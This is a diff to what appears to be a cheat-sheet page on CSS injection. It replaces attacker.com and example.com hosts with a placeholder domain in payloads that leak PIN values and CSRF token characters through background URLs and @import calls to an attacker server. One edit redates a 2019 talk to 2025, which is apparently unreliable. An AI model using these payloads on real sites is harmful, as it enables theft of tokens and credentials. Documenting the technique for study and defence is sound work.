@@ -47,7 +47,7 @@ input[value^="TOKEN_012"] {
 
 ```css
 input[name="pin"][value="1234"] {
-  background: url(https://attacker.com/log?pin=1234);
+  background: url(https://[ATTACKER.DOMAIN.TLD]/log?pin=1234);
 }
 ```
 
@@ -57,7 +57,7 @@ input[name="pin"][value="1234"] {
 
 ```css
 input[name="csrf-token"][value^="a"] + input {
-  background: url(https://example.com?q=a)
+  background: url(https://[ATTACKER.DOMAIN.TLD]/?q=a)
 }
 ```
 
@@ -76,8 +76,8 @@ div:has(input[value="1337"]) {
 This technique is known as **Blind CSS Exfiltration**. It relies on importing external stylesheets to trigger callbacks.
 
 ```html
-<style>@import url(http://attacker.com/staging?len=32);</style>
-<style>@import'//YOUR-PAYLOAD.oastify.com'</style>
+<style>@import url(http://[ATTACKER.DOMAIN.TLD]/staging?len=32);</style>
+<style>@import'//[ATTACKER.DOMAIN.TLD]'</style>
 ```
 
 Frames do not always need to be reloaded to reevaluate CSS. The `@import` rule allows for latency; the browser will process the import and apply the new styles.
@@ -192,7 +192,7 @@ Payload example using `fontleak` with a custom selector, parent element, and alp
 * [CSS based Attack: Abusing unicode-range of @font-face - Masato Kinugawa - October 23, 2015](https://web.archive.org/web/20260212042745/https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)
 * [CSS Data Exfiltration to Steal OAuth Token - - September 13, 2025](https://web.archive.org/web/20250601232405/https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token)
 * [CSS Injection - xsleaks.dev - May 9, 2025](https://web.archive.org/web/20260114161847/https://xsleaks.dev/docs/attacks/css-injection/)
-* [CSS Injection Attacks or how to leak content with <style> - Pepe Vila - 2019](https://web.archive.org/web/20250928084357/https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf)
+* [CSS Injection Attacks or how to leak content with <style> - Pepe Vila - September 28, 2025](https://web.archive.org/web/20250928084357/https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf)
 * [CSS Injection: Attacking with Just CSS (Part 2) - aszx87410 - September 24, 2023](https://web.archive.org/web/20231223213409/https://aszx87410.github.io/beyond-xss/en/ch3/css-injection-2/)
 * [Fontleak: exfiltrating text using CSS and Ligatures - Dragos Albastroiu - April 16, 2025](https://web.archive.org/web/20251130021102/https://adragos.ro/fontleak/)
 * [How you can steal private data through CSS injection - invicti - April 23, 2018](https://web.archive.org/web/20251107094938/https://www.invicti.com/blog/web-security/private-data-stolen-exploiting-css-injection)
